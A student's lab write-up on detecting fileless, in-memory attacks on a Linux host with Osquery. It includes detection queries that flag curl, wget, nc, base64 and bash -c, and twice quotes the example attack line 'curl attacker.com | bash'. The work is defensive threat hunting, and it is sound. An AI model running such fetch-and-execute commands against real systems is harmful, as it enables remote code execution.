# Week 4 Day 5 - Memory & Fileless Detection (Osquery)

This module captures my Week 4 Day 5 endpoint fileless and in-memory execution investigation using Osquery. The focus was to detect attacks that execute entirely in memory without leaving files on disk.

## Day Objective

Today I focused on behavioral endpoint hunting without relying on disk artifacts.

By the end of this lab, I wanted to be able to:

- Hunt for suspicious command-line execution patterns
- Identify interpreter abuse and payload delivery chains
- Detect processes executing from memory with no file origin
- Understand context: legitimate tools vs attacker usage
- Write confident conclusions when fileless attack activity is ruled out

## Concept in Practical Terms

Fileless attacks skip the disk entirely.

Instead of asking: "Where is the malware file?"

ask: "What is this process DOING right now?"

The detection mindset shifted toward:

- Inline execution (bash -c, pipes)
- Interpreter-based payloads (bash, python, perl)
- Process chains that chain execution
- Command-line behavior patterns
- What environment variables reveal about execution intent

## Query Evidence and Analysis

### A) Suspicious Command-Line Patterns

```sql
SELECT pid, name, cmdline
FROM processes
WHERE cmdline LIKE '%bash -c%'
   OR cmdline LIKE '%curl%'
   OR cmdline LIKE '%wget%'
   OR cmdline LIKE '%nc%'
   OR cmdline LIKE '%base64%';
```

Observed:

- No rows returned.

Interpretation:

No processes were identified executing suspicious command-line patterns such as inline shell execution, remote payload retrieval via curl/wget, network command shells, or encoded payload execution. This reduces likelihood of fileless payload delivery via direct command-line execution.

Conclusion:

No evidence of inline or command-fetched fileless execution identified.

### B) Pipe and Redirection Detection

```sql
SELECT pid, name, cmdline
FROM processes
WHERE cmdline LIKE '%|%'
   OR cmdline LIKE '%>%'
   OR cmdline LIKE '%<%';
```

Observed:

- No rows returned.

Interpretation:

No evidence of piped or redirected command execution was detected in active process list. This reduces likelihood of chained payload delivery (for example: `curl attacker.com | bash`).

Conclusion:

No suspicious piped execution chains identified.

### C) Interpreter-Launched Process Analysis

```sql
SELECT 
  p.pid,
  p.name,
  p.cmdline,
  pp.name AS parent_name
FROM processes p
LEFT JOIN processes pp
  ON p.parent = pp.pid
WHERE p.name IN ('bash','sh','python','perl');
```

Observed:

- bash (PID 2132) spawned by login
- bash (PID 2222) spawned by sshd
- bash (PID 2406) spawned by script

Interpretation:

All interpreter activity was consistent with interactive user sessions and administrative actions. The execution chain (login → bash, sshd → bash, script → bash → osqueryi) reflects expected behavior during SSH-based remote administration and lab investigation. No evidence of interpreter abuse for automated payload execution or hidden scripting was identified.

Conclusion:

Interpreter activity is benign and user-driven.

### D) Processes Without File Paths

```sql
SELECT pid, name, path
FROM processes
WHERE path = '' OR path IS NULL;
```

Observed:

- Approximately 100+ processes with NULL or empty paths
- Examples: systemd (pid 1), kthreadd (pid 2), kworker variants, kauditd, sshd, cron, dbus-daemon, rsyslogd, ModemManager, etc.

Interpretation:

Processes without file paths were identified as kernel threads (`kworker*`, `kthreadd`, `rcu_*`, etc.) and expected system-level daemons (systemd, sshd, cron, dbus). This is expected behavior in Linux systems where kernel-managed processes and certain services do not have traditional binary file paths.

No anomalous user-space processes lacking file paths were observed that would suggest fileless injection or process hollowing.

Conclusion:

Process path analysis supports expected system baseline; no fileless injection indicators identified.

### E) Environment Variables and Payload Indicators

```sql
SELECT * FROM process_envs;
```

Observed:

- User environment variables: USER=cody, HOME=/home/cody, SHELL=/bin/bash, PATH=/usr/local/sbin:...
- Session variables: LANG=en_US.UTF-8, TERM (logged in via TTY)
- System variables: DBUS_SESSION_BUS_ADDRESS, XDG_SESSION_ID, etc.
- Notable: LESSOPEN=| /usr/bin/lesspipe %s

Interpretation:

Environment variable analysis revealed no encoded payloads or suspicious injection attempts. The LESSOPEN variable contains a pipe (|) to /usr/bin/lesspipe, which is a standard system utility for handling file previews in the `less` pager. This is expected behavior, not indicative of malicious fileless execution.

Legitimate administrative context:

- User login session (cody) via SSH
- Standard shell environment
- Expected daemons and services

Conclusion:

No suspicious environment variable indicators of fileless payload injection identified.

## Exercise Responses

### Exercise 1 — Command-Line Hunt

Query results identified zero processes using curl, wget, bash -c, nc, or base64 encoding. These patterns are often associated with fileless payload delivery. The absence of these patterns on this system reduces attack surface likelihood during the collection window.

### Exercise 2 — Pipe Detection

No processes were identified using pipe (|), output redirect (>), or input redirect (<) operators. These operators are common in fileless attack chains that chain command execution across interpreters. Their absence suggests no active piped payload delivery was in progress.

### Exercise 3 — Interpreter Analysis

Three bash processes were identified:

1. bash (PID 2132) from login — interactive session from console
2. bash (PID 2222) from sshd — interactive SSH session (user cody)
3. bash (PID 2406) from script — session recorder for lab activity

All are directly tied to interactive user activity. None show signs of automated or hidden payload execution. All parent-child relationships were legitimate.

### Exercise 4 — Fileless Indicators

Processes without file paths were analyzed. The vast majority are kernel-managed threads (kworker, kthreadd, etc.) or expected system daemons (systemd, sshd, cron). This is baseline expected behavior. No suspicious user-space processes without file paths indicating fileless injection were identified.

### Exercise 5 — Real-World Scenario

Scenario: Attacker executes fileless payload in memory using bash and establishes C2.

What I checked and ruled out:

- Inline shell execution (bash -c, curl | bash): None found
- Piped command chains: None found
- Interpreter abuse: All bash processes tied to legitimate sessions
- Process path anomalies: Kernel/system processes only
- Payload indicators in environment: LESSOPEN is standard utility

Assessment:

No evidence of fileless or in-memory execution techniques matching this attack pattern was identified. The system showed expected baseline behavior without indicators of compromise or hidden command-and-control activity.

## Scenario-Based Q and A

Q: What was the hardest part of fileless detection?
A: Understanding that tools like bash and curl are not inherently suspicious — context (who launched them, from where, with what arguments) is what determines intent.

Q: How did I know the LESSOPEN pipe was safe?
A: Recognized it as a standard system utility, not a dynamically injected payload. Legitimate pipes are documented system behavior.

Q: Why are processes without paths not automatically suspicious?
A: Kernel threads have no user-space binary file, so NULL paths are expected. User-space daemons may also lack traditional file references. The key is distinguishing system processes from anomalous execution.

Q: What would have changed my conclusion?
A: If I'd found bash -c execution, active piped commands, or user-space processes with hidden parents, that would have escalated to compromise indicators.

## Mini Challenge Reflection

Fileless attacks often leave behavioral traces even without files. By hunting command-line patterns, execution chains, and process context, I can detect memory-resident threats. I also learned that context matters more than the tool — curl itself isn't suspicious; `curl attacker.com | bash` is.

## Key Terms

- Fileless execution: Code running in memory without writing to disk
- Inline execution: Direct command invocation via `-c` flag or similar
- Interpreter abuse: Using bash, python, perl, etc. to execute unauthorized code
- Process chain: Parent-child execution relationships revealing attack sequence
- Behavioral detection: Identifying threats through actions, not artifacts
- Environment injection: Using environment variables to pass payloads
- Kernel threads: System processes without user-space binary files

## My Takeaways

- Fileless attacks still leave behavioral traces in processes and command-lines.
- Context and parent-child relationships are critical for ruling out legitimate use.
- Kernel processes with NULL paths are expected and normal.
- No-result queries are still valid findings when they rule out attack patterns.
- Legitimate tools require scrutiny of usage patterns, not just presence.

## Submission Summary

### Results from Required Areas

- Command-line hunt: No suspicious patterns (bash -c, curl, wget, nc, base64) identified
- Pipe detection: No piped or redirected execution chains detected
- Interpreter analysis: Bash processes verified as legitimate interactive sessions (login, SSH, lab activity)
- Fileless indicators: Processes without paths verified as kernel threads and system daemons; no anomalous user-space execution detected
- Environment variables: Standard session environment; LESSOPEN identified as expected system utility

### Suspicious Findings (or Justification of None)

No evidence of fileless or in-memory execution techniques was identified. Process command-line analysis revealed no suspicious inline execution, piping, or encoded payload activity. Interpreter usage was consistent with legitimate interactive sessions, and all processes without file paths were verified as expected kernel or system-level processes. No indicators of fileless compromise were observed.


### Concepts

- Fileless malware techniques
- In-memory execution patterns
- Interpreter abuse detection
- Behavioral detection without disk artifacts

### Skills

- Detecting execution patterns beyond file signatures
- Identifying suspicious command usage and chaining
- Analyzing process lineage for hidden execution
- Distinguishing legitimate from malicious tool usage

## Next Up

Day 6 - Detection Engineering (Build Your Own Detections)
